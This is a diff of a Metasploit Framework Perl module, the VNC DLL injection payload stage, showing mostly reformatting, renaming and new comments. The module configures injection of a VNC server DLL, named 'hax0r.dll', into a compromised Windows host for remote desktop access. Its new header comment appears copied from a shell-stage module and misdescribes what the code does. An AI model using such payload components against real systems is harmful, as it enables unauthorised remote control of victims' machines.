@@ -1,45 +1,70 @@
-
+###############
 ##
-# This file is part of the Metasploit Framework and may be redistributed
-# according to the licenses defined in the Authors field below. In the
-# case of an unknown or missing license, this file defaults to the same
-# license as the core Framework (dual GPLv2 and Artistic). The latest
-# version of the Framework can always be obtained from metasploit.com.
+#
+#    Name: ShellStage.pm
+# Version: $Revision$
+# License:
+#
+#      This file is part of the Metasploit Exploit Framework
+#      and is subject to the same licenses and copyrights as
+#      the rest of this package.
+#
+# Descrip:
+#
+#      Calls RevertToSelf and then creates a command interpreter
+#      with input/output redirected to the file descriptor from the
+#      first stage.
+#
 ##
+###############
 
-package Msf::PayloadComponent::Win32InjectVncStage;
+package Msf::PayloadComponent::Windows::ia32::InjectVncStage;
+
 use strict;
-use base 'Msf::PayloadComponent::Win32InjectLibStage';
+use base 'Msf::PayloadComponent::Windows::ia32::InjectLibStage';
 use FindBin qw{$RealBin};
-
 
 my $info =
 {
-  'Authors'      => [
-                        'Matt Miller <mmiller [at] hick.org>',
-                        'Jarkko Turkulainen <jt [at] klake.org>',
-                    ],
-  'UserOpts'     => { 
-                        'VNCDLL'  => [1, 'PATH', 'The full path the VNC service dll', "$RealBin/data/vncdll.dll"],
-                        'VNCPORT' => [1, 'PORT', 'The local port to use for the VNC proxy',  5900],
-                        'AUTOVNC' => [1, 'BOOL', 'Automatically launch vncviewer', 1],
-                    },
-                
+	'Authors'       => 
+		[
+			'Matt Miller <mmiller [at] hick.org>',
+			'Jarkko Turkulainen <jt [at] klake.org>',
+		],
+	'UserOpts'      => 
+		{ 
+			'VNCDLL'  => [1, 'PATH', 'The full path the VNC service dll', "$RealBin/data/vncdll.dll"],
+			'VNCPORT' => [1, 'PORT', 'The local port to use for the VNC proxy',  5900],
+			'AUTOVNC' => [1, 'BOOL', 'Automatically launch vncviewer', 1],
+		},
+
 };
 
-sub new {
-  my $class = shift;
-  my $hash = @_ ? shift : { };
-  $hash = $class->MergeHashRec($hash, {'Info' => $info});
-  my $self = $class->SUPER::new($hash, @_);
-  return($self);
+sub new
+{
+	my $class = shift;
+	my $hash = @_ ? shift : { };
+	my $self;
+
+	$hash = $class->MergeHashRec($hash, {'Info' => $info});
+	$self = $class->SUPER::new($hash);
+
+	return $self;
 }
 
-sub _InjectDLL {
-  my $self = shift;
-  return $self->GetVar('VNCDLL');
+#
+# Returns the path of the VNC DLL that is to be injected
+#
+sub _InjectDLL 
+{
+	my $self = shift;
+
+	return $self->GetVar('VNCDLL');
 }
 
+#
+# Returns the pseudo-name of the DLL that is being injected
+#
 sub _InjectDLLName
 {
 	my $self = shift;
@@ -47,7 +72,11 @@ sub _InjectDLLName
 	return "hax0r.dll"; # randomize me!
 }
 
-sub HandleConnection {
+#
+# Transfers the VNC DLL and begins the proxy connection
+#
+sub HandleConnection 
+{
   my $self = shift;
   my $sock = $self->PipeRemoteOut;
   $self->SUPER::HandleConnection;
